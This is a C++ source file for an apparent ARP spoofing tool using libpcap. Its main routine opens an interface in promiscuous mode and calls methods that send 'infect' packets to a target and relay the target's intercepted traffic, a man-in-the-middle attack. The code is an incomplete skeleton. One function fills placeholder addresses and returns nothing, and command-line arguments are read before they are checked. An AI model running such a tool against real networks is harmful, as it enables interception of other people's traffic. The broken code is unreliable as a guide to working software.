#include "main.h"
#include "arpSpoof.h"

u_char* 
getTargetMacAddress() {
	etherHeader eth;
	arpHeader arp;

	eth.destinationMacAddress = 0xFFFFFFFFFFFF;
	eth.sourceMacAddress = 0x00; // My MAC Address
	eth.type = ETHERTYPE_ARP;

	arp.senderHardwareAddress = 0x00; // My MAC Address
	arp.senderProtocolAddress = 0; // My IP Address
	arp.targetHardwareAddress = 0xFFFFFFFFFFFF;
	arp.targetProtocolAddress = 0; // Target IP Address
}

// Print Usage
void
usage()
{
	printf("Usage: arp_spoof <interface> <sender ip> <target ip>\n");
	printf("sample: arp_spoof wlan0 10.0.0.1 10.0.0.2\n");
}

int
main(int argc, char* argv[])
{
	ArpSpoof arp{ argv[1] };
	pcap_t* handle;
	char errbuf[PCAP_ERRBUF_SIZE];

	if (argc != 4) {
		usage();
		exit(EXIT_FAILURE);
	}

	handle = pcap_open_live(argv[1], BUFSIZ, PROMISCUOUS, 1024, errbuf);
	if (handle == NULL) {
		perror("pcap_open_live");
		exit(EXIT_FAILURE);
	}

	// 1. getting me and target MAC Address

	// 2. send ARP Packet to target for infect 
	arp.setEtherHeader();
	arp.setArpHeader();
	arp.sendInfectPacket();

	// 3. if receive packet of target, relay packet to target. 
	arp.receivePacketRelay();


	if (handle) pcap_close(handle);

	return 0;
}
